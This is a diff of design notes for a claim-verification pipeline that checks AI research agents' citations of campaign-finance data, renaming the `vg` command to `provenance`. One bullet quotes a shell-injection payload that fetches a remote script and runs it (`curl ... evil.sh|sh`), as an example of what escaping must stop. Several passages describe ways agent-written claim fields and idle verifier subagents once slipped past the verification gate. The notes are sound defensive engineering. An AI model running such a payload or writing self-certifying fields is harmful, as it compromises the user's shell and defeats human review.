 reads. The root is hashed resolved, as the run check compares it, and printed that way: hashed
 as spelled, a re-verify naming the same database by an absolute path instead of a relative one
-changed the token and sent the verifier to re-judge identical text. And `vg judge` stamps the run it checked, not a
+changed the token and sent the verifier to re-judge identical text. And `provenance judge` stamps the run it checked, not a
 second read of the registry and database, which a rebuild between the two could move. A query
 context with no recorded run gets no token at all, since nothing says which calculation printed
 it.
 
-`vg judgments` asks the same question `vg judge` does before counting a source as waiting
+`provenance judgments` asks the same question `provenance judge` does before counting a source as waiting
 (`judgments.unjudgeable_page()`, the page counterpart of `unjudgeable_query()`): a source
-verified before `context_page` existed, or whose copy was re-fetched since, is blocked on `vg
+verified before `context_page` existed, or whose copy was re-fetched since, is blocked on `provenance
 verify`, not waiting on a verifier. Counted as waiting, the gate could never reach 0 by judging.
 It asks with the claim file's `context_page` as loaded, before revalidation rebuilds it from
-the page cached now, since that file is what `vg judge` reads.
+the page cached now, since that file is what `provenance judge` reads.
 
 ## A verdict is about the answer it judged, too
 
@@ -789,10 +789,10 @@ a corrected claim in `human_review`, its note describing an answer the claim no 
 No check caught either: same words, same page, same sid.
 
 So `verdicts_for()` compares each verdict's `claim_fingerprint` (the hash of the question and
-answer `vg judge` stamps; why that identity is under #30 above) with the claim's
+answer `provenance judge` stamps; why that identity is under #30 above) with the claim's
 `Claim.fingerprint`. One that differs is stale,
-exactly like a verdict on a re-fetched page: not applied, reported by `vg verify`, `vg build`
-and `vg judgments`, counted in the gate, and replaced by the next `vg judge`. That covers the
+exactly like a verdict on a re-fetched page: not applied, reported by `provenance verify`, `provenance build`
+and `provenance judgments`, counted in the gate, and replaced by the next `provenance judge`. That covers the
 sources the claim still cites: there a stale `contradicts` reads `unreviewed` like any stale
 verdict, so a corrected claim waits on a verdict about its new answer (`pending`), not on one
 about the old answer. A `contradicts` on a source the claim no longer cites matches none of its
@@ -806,19 +806,19 @@ page.
 
 **A legacy verdict, with no fingerprint, is stale.** The page rule above bounds a legacy verdict
 by `judged_at` against the time every fetch stamps on its page. Nothing records when an answer
-was written: `checked_at` moves on every `vg verify`, which re-checks every claim, and a claim
+was written: `checked_at` moves on every `provenance verify`, which re-checks every claim, and a claim
 file's mtime moves on every write-back and checkout. With no bound, the query rule applies:
 unknown fails toward re-checking. **One-time cost:** every verdict recorded before #30 is judged
-again once, and `vg judge` records over it. Rejected: grandfathering them, which keeps the false
+again once, and `provenance judge` records over it. Rejected: grandfathering them, which keeps the false
 green open for every verdict already on disk, against retries made after this change too; and
 backfilling the current fingerprint, which certifies whatever the answer says now.
 
-**Where it stops: the stamp is the claim `vg judge` reads, not the one the verifier read.** If
-the claim changes between hand-off and `vg judge`, a verdict about the old answer is stamped
-with the new one and reads fresh. `vg judge` refuses a fresh retry file until `vg verify` has
+**Where it stops: the stamp is the claim `provenance judge` reads, not the one the verifier read.** If
+the claim changes between hand-off and `provenance judge`, a verdict about the old answer is stamped
+with the new one and reads fresh. `provenance judge` refuses a fresh retry file until `provenance verify` has
 run on it, but not one verified since, and not an answer edited in place, which keeps the
 file's verification. #36's context token closes it: the token hashes the question and answer
-with the context, and `vg judge` refuses one handed back for anything else. Until both have
+with the context, and `provenance judge` refuses one handed back for anything else. Until both have
 landed, don't retry a claim while its judgment pass is running.
 
 ## Cache is authoritative — so version the extractor
@@ -838,8 +838,8 @@ over the cached page would send every citation of it to `fetch_failed` — a fix
 the pages it meant to improve. The good copy is kept and served as-is under its older
 version; the failure is recorded on the page (`refetch_failure`), so it is retried only on
 `--refresh` or the next bump, not on every run. It is reported where each reader looks: a
-warning per run naming the URL and the failure; `vg fetch` and `vg check`; and, first in
-the reason, every row `vg verify` checks against that page, plus every usable row `vg build`
+warning per run naming the URL and the failure; `provenance fetch` and `provenance check`; and, first in
+the reason, every row `provenance verify` checks against that page, plus every usable row `provenance build`
 re-derives — the review app and the retry loop never see a log. "Failed" means an
 exception, a non-2xx/3xx or no text, never the paywall heuristic: that flags any short titled
 page, and extractor fixes shorten pages. Verdicts are checked against the page's own
@@ -853,27 +853,27 @@ stop meaning anything.
 
 ## localStorage and file://
 
-The review app must be served (`vg serve`), not opened as a file. Several browsers disable
+The review app must be served (`provenance serve`), not opened as a file. Several browsers disable
 `localStorage` on `file://` origins and the checkbox state vanishes with no error.
 
 ## A refused build leaves nothing to serve
 
-`vg build` renders nothing when it can't read what it would check or render: an unreadable
+`provenance build` renders nothing when it can't read what it would check or render: an unreadable
 question set, claim, verdict or archive file, among others. That wrote nothing, so the previous
-build's `out/review.html` and `out/claims.json` stayed. `vg serve` checks only that
+build's `out/review.html` and `out/claims.json` stayed. `provenance serve` checks only that
 `review.html` exists, so it served that render without a word, and a reviewer went on ticking a
 page the pipeline had just refused to produce. That render predates whatever the build refused
 on, so it can hold a claim filed under an id that now asks another question: what the stable-id
 gate exists to keep out of review.
 
-So `vg build` removes the last render first, before any step that can stop it
+So `provenance build` removes the last render first, before any step that can stop it
 (`report.clear_render()`). Whatever stops the build then leaves no review app: a refusal, a
 crash, or a kill (a closed terminal or a tool's timeout included, which run no exit handler).
-`vg serve` refuses, naming a refused build as a cause, and a page reloaded from a running
-`vg serve` gets a 404. It gets one while any build runs, too, until that build writes the new
+`provenance serve` refuses, naming a refused build as a cause, and a page reloaded from a running
+`provenance serve` gets a 404. It gets one while any build runs, too, until that build writes the new
 render. Nothing is lost. The render is regenerable, and review progress lives in the browser's
 `localStorage`, keyed by the title, so it comes back with the next build that succeeds. Only the
-files a build writes are removed, along with any temp file a killed build left (`vg serve`
+files a build writes are removed, along with any temp file a killed build left (`provenance serve`
 lists `out/`, dotfiles included, and one can hold a whole page); anything else in `out/` stays.
 If they can't be removed, the build says so and stops, and they stay until someone removes them
 by hand. Two builds of one run at once are not supported: both write the same `out/`, so the
@@ -952,7 +952,7 @@ the pipeline, put it in the race file instead.
 
 Tests see only the synthetic race in `tests/fixtures/races/`, through conftest's autouse
 `example_race`, which patches `races.RACES_DIR` with the test's own `monkeypatch`. So
-`monkeypatch.undo()` partway through a test undoes that too, and the next `vg` command fails
+`monkeypatch.undo()` partway through a test undoes that too, and the next `provenance` command fails
 to load a race, with a bare exit 1 under `CliRunner`. Scope a temporary patch with
 `with monkeypatch.context() as m:` instead.
 
@@ -967,7 +967,7 @@ filing never surfaces, and the corroboration you get back is the pipeline agreei
 itself.
 
 **Race context is thin on purpose.** `race.context` goes verbatim into every researcher
-prompt, and it is unverified by construction — no snippet, no source, `vg verify` never
+prompt, and it is unverified by construction — no snippet, no source, `provenance verify` never
 looks at it. So a factual claim placed there is believed by every researcher and checked by
 none. Context earns its place by helping *find records* (which bodies keep minutes on this
 office, which LegInfo host covers which years); anything else is a question with a citation.
@@ -978,7 +978,7 @@ topping up a claim with the answer.
 ## One run per candidate; one cache for all of them
 
 Each candidate is a separate run under `data/<candidate-id>/` — own claims, own retries,
-own review progress. `vg new-candidate <id>` scaffolds it and retargets the question set to
+own review progress. `provenance new-candidate <id>` scaffolds it and retargets the question set to
 that person's name, so a researcher is never left inferring who "the candidate" means.
 
 The page cache is deliberately **not** per-candidate. The same filing, article, or roll call
@@ -986,7 +986,7 @@ routinely covers more than one of them, and re-fetching per run would both waste
 risk handing two runs different bytes for the same URL.
 
 Two things that must stay per-candidate: the review app's storage key (it is derived from
-the title, which is why `vg build --candidate <id>` names the person — two candidates
+the title, which is why `provenance build --candidate <id>` names the person — two candidates
 sharing a key would show each other's checkmarks), and the race file's completeness check.
 
 One consequence of separate runs worth keeping in mind: `conflicts.py` compares dollar
@@ -1004,7 +1004,7 @@ stray or not, and names the stray in a yellow warning; `--cache` still overrides
 own `cache/` is deliberately NOT part of the test: it is gitignored, so on a fresh clone it
 does not exist yet and the first run would fork. Don't let the existence of an output
 directory decide where outputs go: whatever first creates it gets to pick. Every command that
-touches the cache — `vg calaccess` included — must resolve its root through `_cache_root()`
+touches the cache — `provenance calaccess` included — must resolve its root through `_cache_root()`
 and take `--cache`, or two commands disagree about where the database lives. That includes reads: the verdict
 staleness check used to look under the candidate dir and, through `cache_dir()`'s mkdir,
 recreate the stray on every run (see "A verdict is about a source as cached at judgment time").
@@ -1021,7 +1021,7 @@ hand, in three parts:
 Nothing in the pipeline moves a claim between ids. A dependent still naming a retired id goes to
 `human_review` with the input missing.
 
-**`vg build` and `vg status` are the rule's gate** (`questions.check()`, run by
+**`provenance build` and `provenance status` are the rule's gate** (`questions.check()`, run by
 `cli._question_ids()`). Each compares every claim with the question the run's `questions.json`
 holds for its id. Two breaks fail it:
 - a claim on an id the set does not list: a retired id whose claim was left in `claims/`, which
@@ -1033,7 +1033,7 @@ holds for its id. Two breaks fail it:
 A failing claim is left out of the review app and the status table, and the command exits 1,
 naming it last. The rest still render, as `load_claims()` skips an unreadable claim: one
 mis-filed claim must not cost the run every other one. A claim deriving from one left out reads
-its input as missing and goes to `human_review`. Before the gate, `vg build` never read
+its input as missing and goes to `human_review`. Before the gate, `provenance build` never read
 `questions.json`, and every command exited 0 on both breaks.
 
 "The text at its id" is compared the way a snippet's normalized match is, through
@@ -1046,14 +1046,14 @@ A `maps_from` still declared in the set is reported without failing: nothing app
 no claim moves, and each is checked against the question at the id it sits on. Settle it and
 delete the key. An identity pair moved nothing, so it is not reported.
 
-`vg check-claim` runs the same comparison on the one claim a researcher is handing on, so a
+`provenance check-claim` runs the same comparison on the one claim a researcher is handing on, so a
 misquoted question fails there, before build leaves it out of review. It checks against the set
 of the run the claim sits in, the directory holding its `claims/` (resolved, so a relative
 path from inside `claims/` works), not `--data`. A researcher on a candidate run checks with the
 default `--data data`, whose set is the root template, not the copy retargeted to the candidate.
 
 Which `questions.json` is the run's is #8. Until a run declares it, the gate reads the run's own
-(`data/<candidate>/questions.json`, which `vg new-candidate` writes), else the data root's. A
+(`data/<candidate>/questions.json`, which `provenance new-candidate` writes), else the data root's. A
 candidate run's own copy is not updated when the template gains a question, so add a new one to
 each run's copy as well. A set that can't be read as one question per id fails the whole
 command, and build renders nothing, since no claim could be checked. The message names every
@@ -1073,8 +1073,8 @@ verdict about the new one (see "A verdict is about the answer it judged, too"). 
 judgment pass, and the gate catches the reuse itself only while the old claim is still in
 `claims/`, so still move a reworded or replaced question to a new id before anyone researches it.
 
-This rule replaced `vg remap`, which re-filed claims onto a renumbered question set (declared
-as `maps_from` in `questions.json`) and re-homed their verdicts, and `vg judgments --repair`,
+This rule replaced `provenance remap`, which re-filed claims onto a renumbered question set (declared
+as `maps_from` in `questions.json`) and re-homed their verdicts, and `provenance judgments --repair`,
 which re-homed verdicts after the fact. Both are retired: invoking either exits 1 and states
 this rule. Question ids are also file names, and a verdict belongs to a claim only through the
 shard it sits in, so every move was a chance to attach a real verdict to the wrong claim. remap
@@ -1086,26 +1086,26 @@ Hardening it further cost more than it could ever save, and stable ids remove th
 
 What is left:
 - `maps_from` and `mapped_from` in a `questions.json`, and `previous_question` in a claim file,
-  still load; nothing writes them, and the gate reports a `maps_from` (above). `vg new-candidate`
+  still load; nothing writes them, and the gate reports a `maps_from` (above). `provenance new-candidate`
   copies neither of the first two: they are another run's history, and a new run has no earlier
   id space. `Claim` has no
-  `previous_question` field, so it is ignored on load and the next `vg verify` write-back drops
+  `previous_question` field, so it is ignored on load and the next `provenance verify` write-back drops
   it, as it always has (#85, closed with remap, since nothing writes it now).
 - A `judgments-backup/` that an interrupted re-home left behind still stops every command that
-  reads verdicts, `vg remap` included, because the shards may be half-rewritten. The message
-  says how to undo it: run `vg judgments --rollback` from a checkout of
+  reads verdicts, `provenance remap` included, because the shards may be half-rewritten. The message
+  says how to undo it: run `provenance judgments --rollback` from a checkout of
   `judgments.LAST_WITH_ROLLBACK`, with the run's absolute path, since a relative `--data` there
   names that checkout's own data/. The rollback leaves the migration pending, so then re-run the
   interrupted command from that same checkout to finish it.
   `judgments-backup.partial/` and `judgments-backup.discard/` are different: one was still being
   built and had touched no shard, and the other was already retired after its re-home finished.
-  Nothing reads them, and nothing clears them now, so `vg judgments` names them
+  Nothing reads them, and nothing clears them now, so `provenance judgments` names them
   (`judgments.leftovers()`). Delete them; never restore from them.
 - A run's `.remap-applied` marker is read by nothing now. The old instructions said to commit it
   beside the run's claims, so a tracked one can outlive the command, and `.gitignore` covers only
   the data root's: delete it in the run's next commit.
 - Question-id validation was never remap's and stays: the id pattern (`models.QID_PATTERN`,
-  checked again in `judgments.path_for()`), and `vg judgments` counting a shard the disk opens
+  checked again in `judgments.path_for()`), and `provenance judgments` counting a shard the disk opens
   under a claim's id as that claim's (`judgments.opened_as()`).
 
 Lessons from it that still apply:
@@ -1133,7 +1133,7 @@ Lessons from it that still apply:
   holds breaks on the first Mac to clone it. CI's disk is case-sensitive, so the
   case-insensitive path never runs there: pin it with a test that patches the disk's answer
   (`judgments._same_file()`), as
-  `test_vg_judgments_counts_a_shard_a_case_folding_disk_opens_as_the_claims` does. When a change
+  `test_provenance_judgments_counts_a_shard_a_case_folding_disk_opens_as_the_claims` does. When a change
   touches names, run the suite on both kinds of disk: a Mac's default volume, and
   `pytest --basetemp=<dir>` on a case-sensitive one. A case-sensitive APFS disk image
   (`hdiutil create -fs "Case-sensitive APFS"`) gives a Mac one. If a test there fails on a
@@ -1175,7 +1175,7 @@ agency — right document, wrong year, perfect verification.
 `secondary_host()` catches the class, not the instance: a `primary_document` or
 `official_record` cited from a host that is not the issuing authority. Citing a copy is
 allowed — often it is the only reachable version — but it must carry `secondary_host_ack`
-saying what could not be reached and why this copy is the same document. `vg check-claim`
+saying what could not be reached and why this copy is the same document. `provenance check-claim`
 fails without it, and the review app badges the row "copy, not the issuing authority".
 The rule is not "never cite a copy", it is **never substitute silently**.
 
@@ -1183,8 +1183,8 @@ The other half is fixing the reachability where possible, rather than only detec
 symptom — and then *recording* it, so the finding outlives the session that made it.
 
 `sources/access/<host>.yaml` is that record: what a naive fetch gets, any endpoint that
-works, and the known limits. `vg source-access [host]` reads it, `--run-recipe` executes one,
-and `vg source-import-curl` turns a browser "copy as cURL" into an entry. Negative results
+works, and the known limits. `provenance source-access [host]` reads it, `--run-recipe` executes one,
+and `provenance source-import-curl` turns a browser "copy as cURL" into an entry. Negative results
 belong here too — "probed, needs a session, retrieve by hand" stops the next run from
 re-litigating it and from substituting silently.
 
@@ -1325,7 +1325,7 @@ Related traps in the same data:
   as a lead to check. That holds for a gift a later amendment may have left out too: the
   ranking goes to a person, naming the filing, unless it counts nothing and no left-out gift
   has an amount (#156, under "CAL-ACCESS double-counts").
-  `vg calaccess contributions`
+  `provenance calaccess contributions`
   reads amounts the same way. It prints a blank as `blank` and any other unreadable amount as
   filed, and it gives such gifts their own `--top` slots after the ranked ones, since those
   are the gifts a total names as not counted. The IE listing prints a blank as `blank` but
@@ -1379,7 +1379,7 @@ The constraints that make it trustworthy:
 - **The printed command is agent-authored text handed to a human's shell.** `human_command()`
   `shlex.quote`s the name, every key and every value. It once quoted only values containing a
   space, so `$(curl${IFS}-s${IFS}evil.sh|sh)` went through bare. Quoting cannot fix a control
-  character (it acts on the terminal first), a name starting with `-` (an option to `vg
+  character (it acts on the terminal first), a name starting with `-` (an option to `provenance
   query`), a key containing `=`, or invisible text. `QueryCitation` refuses those at load
   (`queries.unsafe_reason`), `run()` refuses them again, and `human_command()` prints nothing
   for them. That has a measured cost: 84 of ~1.2M distinct contributor names in the export
@@ -1401,7 +1401,7 @@ So a collapsed group carries the EARLIEST filing in the chain (where the gift wa
 reported) plus a count of how many filings restated it. Anywhere else a dedup lands, ask what
 the row still has to be able to point at.
 
-This one also failed *silently*, which is the distinction worth keeping: `vg check-claim`
+This one also failed *silently*, which is the distinction worth keeping: `provenance check-claim`
 caught a stale expected value the same night by refusing with an explanation, and that saved a
 wrong citation twice. An empty field fails quietly and reads as data.
 
@@ -1474,9 +1474,9 @@ question, below: the update filing's rows reach none.)
 finds such a filing: its highest cover `AMEND_ID` is above the highest its table has. It asks
 per filing, through the `FILING_ID` indexes, and only for the filings a result touched:
 - **A citable figure** that counts a row from one carries it (`QueryResult.unrestated`), with
-  what that filing accounts for. `vg verify` and `vg build` send the row to `human_review`,
+  what that filing accounts for. `provenance verify` and `provenance build` send the row to `human_review`,
   naming each filing to open and its share (`QueryResult.unsettled`: the largest few, since it
-  lands in the claim file; `vg query` lists every one). The skill does not retry such a row,
+  lands in the claim file; `provenance query` lists every one). The skill does not retry such a row,
   which would only invite a researcher to change parameters until the filing drops out. The
   value is compared
   as before, so a mismatch is still `snippet_not_found`, and the flag never changes a number.
@@ -1558,7 +1558,7 @@ flagged too, as the mirror image of the one above:
 - **A miss carries it too.** When every match with a readable amount is on a left-out
   schedule, the query finds nothing counted, and "NO MATCH for that name" would tell a
   researcher the donor gave nothing. The note says every such match was left out instead, and
-  `vg query` names the filings. Such a citation goes to `human_review`, not
+  `provenance query` names the filings. Such a citation goes to `human_review`, not
   `snippet_not_found`: a retry of its parameters cannot reproduce it and would only invite a
   mirror, and the reason names the claimed figure, which nothing here checked. The note still
   names another `form_type` that counts the gift: that is a different figure, for the claim to
@@ -1607,7 +1607,7 @@ flagged too, as the mirror image of the one above:
   the check or to that exemption, so a new one fails it until it is classified.
 - **The build loads `EXPN_CD.FORM_TYPE`**, so the check can run on expenditures too. Nothing
   reads `EXPN_CD` yet: a query or listing that does must call `unrestated_schedules()` on it,
-  as the receipt queries do. A database built before that needs `uv run vg calaccess build`,
+  as the receipt queries do. A database built before that needs `uv run provenance calaccess build`,
   and until then `unrestated_schedules()` refuses the table (`DegradedDatabase`) rather than
   read it as settled.
 
@@ -1668,7 +1668,7 @@ and the 3.54 CLI accepts it. A cover lookup (since reverted) that ran fine in th
 
 To measure a view change without touching the live database, build a scratch root **outside
 any data root**, such as a temp directory. Symlink the zip into `<scratch>/cache/calaccess/`,
-then run `uv run vg calaccess build --data <scratch>`. It takes about five minutes and ~6 GB.
+then run `uv run provenance calaccess build --data <scratch>`. It takes about five minutes and ~6 GB.
 Don't use `data/scratch`: `_cache_root()` sends a child of a directory holding `questions.json`
 to its parent, so that build deletes and rebuilds the live database.
 
@@ -1683,7 +1683,7 @@ time, and the real export database kept the per-transaction view after the code 
 So `connect()` installs every dedup view as a TEMP view, which SQLite resolves before `main`,
 and the definition in `calaccess.py` is the one every query runs. A change that only
 redefines a view applies on the next connection, with no rebuild. The persisted copies are
-only as current as the last build, so check a figure with `vg query`, not by hand in the
+only as current as the last build, so check a figure with `provenance query`, not by hand in the
 sqlite3 shell.
 
 **A fix that needs a column the database never loaded still needs a rebuild.** I first wrote
@@ -1701,7 +1701,7 @@ and render green. `ie_total` refused first, for the attribution above. The recei
 refuse too: they never join a cover, but without cover amendment ids nothing can find the rows
 a filing's latest amendment dropped (the flag, above). Until the rebuild, every query citation
 reads as not reproduced. The listings are finding aids, and keep working under the warning.
-The fix is an operator step, `uv run vg calaccess build`, which rebuilds from the downloaded
+The fix is an operator step, `uv run provenance calaccess build`, which rebuilds from the downloaded
 zip.
 
 The same mistake reached a test: a fixture modelled a filing "as filed" from its Form 496 rows
@@ -1717,7 +1717,7 @@ wrong — so when the pipeline and an outside source disagree, check the pipelin
 
 The sharpest line to come out of running this, from the session that got caught by it: *a
 query citation verifies that the query is reproducible, not that the query is correct.*
-`vg verify` marked an inflated support figure green because the query did return its own
+`provenance verify` marked an inflated support figure green because the query did return its own
 recorded `expected` — the number was wrong and the check passed.
 
 What caught it was the judgment pass, not any mechanical check. That is the argument for
@@ -1727,9 +1727,9 @@ keeping a fresh verifier on query citations too, even though the mechanics look 
 like a page.** Every registered name has already returned different numbers after a fix, and
 the sid (name, params, expected) does not cover the calculation: a query fixed to compute
 something else that happened to return the same number kept a verdict about the old one. Each
-`queries.REGISTRY` entry carries a `version`; `vg judge` stamps it on the verdict, and a verdict
+`queries.REGISTRY` entry carries a `version`; `provenance judge` stamps it on the verdict, and a verdict
 under any other version — or none, i.e. recorded before versions existed — is stale and not
-applied. `vg verify` lists them for re-judging.
+applied. `provenance verify` lists them for re-judging.
 
 The bump rule, beside the registry: **bump when a change can alter what the query returns
 for any input the previous version accepted**, even if every recorded figure still
@@ -1775,20 +1775,20 @@ however cosmetic, before committing.
 
 What the figure was checked against is stamped too, machine-owned inside `verification`
 (`query_run`): the version, the date of the CAL-ACCESS export the database was built from
-(`vg calaccess build` records it), and the cache root. The review page prints all three, and
+(`provenance calaccess build` records it), and the cache root. The review page prints all three, and
 the command beside them carries `--cache`, so it reads the database the figure was verified
-against rather than whatever `--data` resolves to. `vg judge` records a verdict only when the
+against rather than whatever `--data` resolves to. `provenance judge` records a verdict only when the
 question's claim file carries a `query_run` matching the current definition, export and root,
 and the context token names that run — the verifier judged one run's context, and stamping
 today's version over an older run's output would make a verdict about the old calculation read
 as current. The file's run alone is not enough: it is the run on disk when judge runs, and a
 re-verify while the verifier worked replaces it (see "Tie a verdict to the context it was
-handed"). Otherwise it refuses and says to re-verify, and `vg judgments` lists such a row as
-blocked (`run vg verify`) rather than counting it in the gate, which judging could then never
+handed"). Otherwise it refuses and says to re-verify, and `provenance judgments` lists such a row as
+blocked (`run provenance verify`) rather than counting it in the gate, which judging could then never
 close.
 
 That check reads a claim file, and sits on the trusted side deliberately: it can only refuse.
-A forged `query_run` gets past it to exactly the stamp `vg judge` wrote before the check
+A forged `query_run` gets past it to exactly the stamp `provenance judge` wrote before the check
 existed — the registry's version and this root's export — never to anything better.
 
 An older export is **reported, not stale**. The sid covers the claim's recorded `expected`,
@@ -1861,7 +1861,7 @@ and name what they counted in their detail. When one misses on the schedule aske
 name or filer has receipts on others, the miss suggests `form_type=<schedule>` instead of
 pointing at the name. It reads those schedules from the raw rows: the dedup's collapsed
 cross-form row keeps only one of its two labels. A late contribution not yet on any schedule A
-is the next section. And `vg calaccess contributions` still lists every schedule without saying
+is the next section. And `provenance calaccess contributions` still lists every schedule without saying
 which (#67).
 
 The schedule handling is shared helpers, not a copy in each query. `queries._schedule()` holds
@@ -1894,10 +1894,10 @@ The queries **flag, and never count**, a late entry that no schedule A restates 
   receipt schedule (which holds Form 496 Part 3, but not Form 497; for one contributor, only
   the Form 496 Part 3 rows filed under the name the sum matches). While a pending late entry
   could change it, the value comes back with each late report attached (`QueryResult.late`:
-  the filing, its amendment and form, what it holds, where to open it). `vg verify` and
-  `vg build` send the row to `human_review`, naming five in the reason (any with an amount
-  nobody stated first, then the most money), and `vg query` prints "Will not verify" with the
-  rest. Build only ever downgrades: once a 460 restates the gifts, `vg verify` clears the hold.
+  the filing, its amendment and form, what it holds, where to open it). `provenance verify` and
+  `provenance build` send the row to `human_review`, naming five in the reason (any with an amount
+  nobody stated first, then the most money), and `provenance query` prints "Will not verify" with the
+  rest. Build only ever downgrades: once a 460 restates the gifts, `provenance verify` clears the hold.
   A stated $0 late entry changes nothing and holds nothing. The value is unchanged, and a mismatch is still `snippet_not_found`.
   For `top_contributor` that is only when the late gifts could change who leads, and it names
   only the reports that could; a ranking they can't move is settled and verifies. Reports are
@@ -1913,7 +1913,7 @@ The queries **flag, and never count**, a late entry that no schedule A restates 
   it goes to `human_review`, as #31's flag does for a figure counting a possibly-withdrawn
   amendment: **a note is enough only when the figure is settled; when the record itself is
   unsettled, the row goes to a person with each filing to open.** The two are one
-  `QueryResult.unsettled`, through the same hooks in `vg verify`, `vg build` and `vg query`.
+  `QueryResult.unsettled`, through the same hooks in `provenance verify`, `provenance build` and `provenance query`.
   A figure can be unsettled both ways, and the reason then names both, each with its own
   filings.
 
@@ -1968,7 +1968,7 @@ makes the query refuse.
 A database that can't read Form 497 can't say that nothing is pending. That covers a database
 built before `S497_CD` was loaded, and one whose `S497_CD` lacks a column the check reads
 (`calaccess.LATE_COLUMNS`). Every schedule that reads late reports (the default, `form_type=A`
-and `""`) refuses there (`DegradedDatabase`) until `uv run vg calaccess build`, as `ie_total`
+and `""`) refuses there (`DegradedDatabase`) until `uv run provenance calaccess build`, as `ie_total`
 does: a warning would let the short total render green, and so would a named schedule that
 could not look. Another schedule (`form_type=C`) never reads late reports and still answers. An export with no `S497_CD.TSV` at all has no late reports to miss. `build()` records
 the tables the export lacked (`EXPORT_META.not_in_export`), which is how the two are told apart.
@@ -2151,7 +2151,7 @@ When you add a query here, ask what it returns for the wrong person.
 ## An agent's declared tools must match what you told it to do
 
 `verifier.md` said `tools: Read, WebFetch` while its instructions told it to run
-`uv run vg judge`. It had no Bash, so it physically could not. All three verifier subagents
+`uv run provenance judge`. It had no Bash, so it physically could not. All three verifier subagents
 went idle in two minutes, wrote nothing, and reported nothing — and because an unjudged
 source rendered green, the result was a silent, complete bypass of the judgment pass. The
 run looked clean.
@@ -2159,7 +2159,7 @@ run looked clean.
 Two rules from that:
 - When you add a command to an agent's instructions, check its frontmatter grants the tool.
 - Make the absence loud rather than trusting the agent ran: a source with no verdict is
-  `pending`, never `verified`. `vg judgments` ends with the count of sources that still
+  `pending`, never `verified`. `provenance judgments` ends with the count of sources that still
   need a verdict.
 
 Silence from a subagent is not success, and the pipeline should not treat it as such.
@@ -2168,7 +2168,7 @@ Silence from a subagent is not success, and the pipeline should not treat it as 
 
 `researcher.md` has said "5–10 distinctive words" since the first commit, and a one-word
 snippet was still written twice in testing. Prose sets the expectation; it does not enforce
-it. `vg check-claim` runs the verifier's own checks and exits non-zero, and the researcher
+it. `provenance check-claim` runs the verifier's own checks and exits non-zero, and the researcher
 is required to reach a clean exit before reporting done.
 
 Generalize the lesson before adding another paragraph of instruction: if a rule matters and
@@ -2177,7 +2177,7 @@ an agent can violate it, give it a command that fails.
 ## A gate is a number the tool prints, counting exactly what its step can close
 
 Sessions decided the judgment pass was finished by running `grep -c unreviewed` on the
-`vg judgments` table. Rich wraps long rows, so the grep under-reported twice, and a run read
+`provenance judgments` table. Rich wraps long rows, so the grep under-reported twice, and a run read
 as done while sources had no verdict. A gate that someone derives by counting rows of display
 output is only as reliable as the display's layout. So the tool prints the number, as the
 last line: `N of M cited source(s) need a verdict (K stale)`. The instructions say to read it,
@@ -2186,12 +2186,12 @@ misread it either.
 
 Getting that number right took six passes, five of them caught in review. In every one, the
 count and build disagreed about which sources belonged in it:
-- **Too few: a stale verdict counted as done.** `vg build` drops a verdict that predates its
+- **Too few: a stale verdict counted as done.** `provenance build` drops a verdict that predates its
   page, so the count could read 0 while the review app still showed pending rows.
 - **Too few: a `support` in the claim file counted as a verdict.** `apply_to()` used to *skip*
   a source with no usable verdict, and build loads claim files trusting machine fields. So a
   `support` already in the file, hand- or agent-written, rendered as judged, which
-  self-certifies the judgment pass. `vg verify` rebuilds `Verification` after stripping, so
+  self-certifies the judgment pass. `provenance verify` rebuilds `Verification` after stripping, so
   pipeline-written files never carry one. `apply_to()` now resets such a source to
   `unreviewed`: a verdict comes from `data/judgments/` or not at all.
 - **Too many: sources with nothing to judge counted as waiting.** The verifier judges from a
@@ -2200,17 +2200,17 @@ count and build disagreed about which sources belonged in it:
   was given and never close the gate.
 - **Wrong source of truth: classifying by the claim file's status.** Build re-checks that
   status against the cache (`revalidate_from_cache()`) and can disagree. It discards a quote
-  that no longer reproduces, and drops a verdict whose context moved since `vg verify`.
+  that no longer reproduces, and drops a verdict whose context moved since `provenance verify`.
 
 Each fix re-derived one more piece of build, and each re-derivation missed something. So
-`vg judgments` now *runs* build's offline checks read-only, as `vg status` does:
+`provenance judgments` now *runs* build's offline checks read-only, as `provenance status` does:
 `judgments.merge()` (the body of `apply_to()`), then `revalidate_from_cache()`. It splits
 what build will show without a verdict into two lines. The gate is sources a verdict would
 fix: status in `verify.GOOD`, so there is confirmed context, and no usable verdict. The rest
 have nothing a verifier can judge yet. Either their status isn't `GOOD`, or revalidation redrew
-the excerpt since `vg verify`, which drops any verdict on the old one, including one recorded
-now: a verifier judges the claim file's excerpt. Or `vg judge` would refuse one
-(`cli._unjudgeable()`, which `vg handoff` asks too). Tests pin the two to add up to
+the excerpt since `provenance verify`, which drops any verdict on the old one, including one recorded
+now: a verifier judges the claim file's excerpt. Or `provenance judge` would refuse one
+(`cli._unjudgeable()`, which `provenance handoff` asks too). Tests pin the two to add up to
 build's `claims.json`. Two more ways the gate read 0 wrongly are also closed: when there was
 nothing to count (a typo'd `--data` or `--question-id`), and when `load_claims()` skipped an
 unreadable claim file. Both now exit 1.
@@ -2264,29 +2264,29 @@ not what it *captured*, and anyone can Save Page Now a page they control. So:
   functions require the cached live page to check as `could_not_verify_paywall`. Without it a
   status hand-edited to `verified_via_archive` reproduced against an earlier faithful capture
   and rendered green — "live page not readable" — over a readable page the quote had since
-  been removed from; and `vg archive`, which loads trusted, upgraded a paywall status written
+  been removed from; and `provenance archive`, which loads trusted, upgraded a paywall status written
   into the claim file the same way. The status is a claim about the live page, so it is
   checked against the live page, never taken from the file.
 - **Only the pipeline's own snapshot is ever used.** `archive_url` used to be kept on ingest,
-  because `vg verify` strips and writes back and would have deleted every snapshot; its
-  safety rested on `vg archive` overwriting it, which it skipped wherever Save Page Now
-  failed — always, on cal-access. Now `vg archive` records what it saved in the run's
+  because `provenance verify` strips and writes back and would have deleted every snapshot; its
+  safety rested on `provenance archive` overwriting it, which it skipped wherever Save Page Now
+  failed — always, on cal-access. Now `provenance archive` records what it saved in the run's
   `archives.json`, and the archive fields are never read from a claim file in any load mode,
   trusted included: `apply_archive()` sets them from the records in every command that
   writes claims back or renders them, and a command that forgets to shows no snapshot rather
   than the file's. `archives.json` is pipeline-owned the way `judgments/` and the page cache
   are — agents don't write there — and its values still pass the target and content checks
   at every use. A run archived before this has no records, so its snapshots disappear until
-  `vg archive` is re-run — failing toward re-checking, and `vg verify` / `vg build` say how
+  `provenance archive` is re-run — failing toward re-checking, and `provenance verify` / `provenance build` say how
   many they ignored. Adopting the old claim-file values instead is exactly the
   agent-authored input this closes.
 
 ## A schema constraint guards only what passes through the schema
 
